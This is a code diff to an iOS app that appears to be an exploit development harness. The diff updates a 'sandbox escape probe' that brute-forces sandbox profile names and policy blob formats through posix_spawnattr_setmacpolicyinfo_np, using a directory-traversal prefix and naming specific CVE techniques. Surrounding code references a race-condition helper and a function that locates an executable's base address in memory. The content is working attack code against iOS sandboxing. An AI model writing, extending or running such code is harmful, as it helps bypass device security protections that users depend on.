@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v225)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v226)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v225: CVE-2026-20628 sandbox-spawnattrs brute-force ===\n"];
+        [self appendLog:@"\n=== Rie v226: iOS profile names + more blob fmts ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9763,11 +9763,21 @@ static uint64_t rie_find_exec_base(task_t task,
         } else {
             [self appendLog:@"posix_spawnattr_setmacpolicyinfo_np: AVAILABLE"];
 
+            // iOS-correct profile names (not macOS hyphenated forms!)
             static const char *profiles[] = {
-                "platform", "no-internet", "baseline", "container", "no-network",
+                "platform",         // baseline, most permissive — shared by both OS
+                "nointernet",       // iOS: no hyphen! (macOS="no-internet")
+                "nonet",            // shorter alias for no-network on iOS
+                "container",        // standard 3rd-party app
+                "baseline",         // generic iOS template
+                "apsd",             // Apple Push daemon — can probably spawn
+                "MobileSafari",     // Safari's profile
+                "pure-computation", // no I/O
             };
             static const int nProfiles = sizeof(profiles)/sizeof(profiles[0]);
-            static const char *fmtNames[] = {"empty","str","ver+str","len+str","2str"};
+            static const char *fmtNames[] = {
+                "empty","str","ver+str","len+str","2str","bplist","pad64"
+            };
             static const int nFmts = sizeof(fmtNames)/sizeof(fmtNames[0]);
 
             NSString *childPath = [[[NSBundle mainBundle] bundlePath]
@@ -9797,6 +9807,20 @@ static uint64_t rie_find_exec_base(task_t task,
                     case 2: { uint32_t v=1; memcpy(blob,&v,4); memcpy(blob+4,prof,profLen+1); blobLen=4+profLen+1; break; } // ver+str
                     case 3: { uint32_t l=(uint32_t)profLen; memcpy(blob,&l,4); memcpy(blob+4,prof,profLen); blobLen=4+profLen; break; } // len+str
                     case 4: memcpy(blob,prof,profLen+1); blob[profLen+1]='\0'; blobLen=profLen+2; break; // two strings
+                    case 5: { // bplist magic header + profile name
+                        memcpy(blob, "bplist00", 8);
+                        blob[8] = 0x00; // version
+                        memcpy(blob+9, prof, profLen+1);
+                        blobLen = 9 + profLen + 1;
+                        break;
+                    }
+                    case 6: { // padded struct: 64B name + 256B path
+                        memset(blob, 0, 320);
+                        memcpy(blob, prof, profLen < 63 ? profLen : 63);
+                        // container path stays empty
+                        blobLen = 320;
+                        break;
+                    }
                     }
 
                     posix_spawnattr_t spattr;
